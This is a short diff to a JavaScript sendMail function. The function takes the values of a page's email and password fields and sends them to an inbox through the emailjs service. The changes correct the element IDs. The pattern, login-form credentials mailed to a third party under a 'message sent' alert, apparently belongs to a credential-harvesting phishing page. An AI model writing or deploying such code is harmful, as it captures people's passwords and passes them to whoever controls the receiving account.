@@ -1,6 +1,6 @@
 function sendMail() {
   var params = {
-    name: document.getElementById("loginForm").value,
+    name: document.getElementById("email").value,
     email: document.getElementById("password").value,
   };
 
@@ -9,7 +9,7 @@ function sendMail() {
 
     emailjs.send(serviceID, templateID, params)
     .then(res=>{
-        document.getElementById("loginForm").value = "";
+        document.getElementById("email").value = "";
         document.getElementById("password").value = "";
         console.log(res);
         alert("Your message sent successfully!!")
